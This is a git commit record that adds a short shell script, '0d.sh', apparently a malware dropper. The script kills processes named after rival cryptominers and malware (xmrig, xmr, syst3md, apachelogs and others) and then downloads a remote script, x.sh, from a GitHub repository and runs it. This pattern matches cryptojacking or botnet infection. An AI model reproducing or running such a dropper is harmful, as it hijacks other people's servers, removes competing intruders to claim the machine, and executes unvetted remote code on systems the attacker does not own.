63c2c132dfb69cb0c02fc2dc03bae5e458ea2cfc
ZeroDayx <153572010+ZeroDayx@users.noreply.github.com>
2025-03-21 21:08:27 -0700

    Add files via upload

---
+++ 0d.sh
@@ -0,0 +1,10 @@
+pkill -f lol; \
+pkill -f noob; \
+pkill -f "./start"; \
+pkill -f apachelogs; \
+pkill -f a.sh; \
+pkill -f syst3md; \
+pkill -9 start; \
+pkill -f xmrig; \
+pkill -f xmr; \
+curl -LO https://raw.githubusercontent.com/ZeroDayx/x/refs/heads/main/x.sh && chmod +x x.sh && ./x.sh
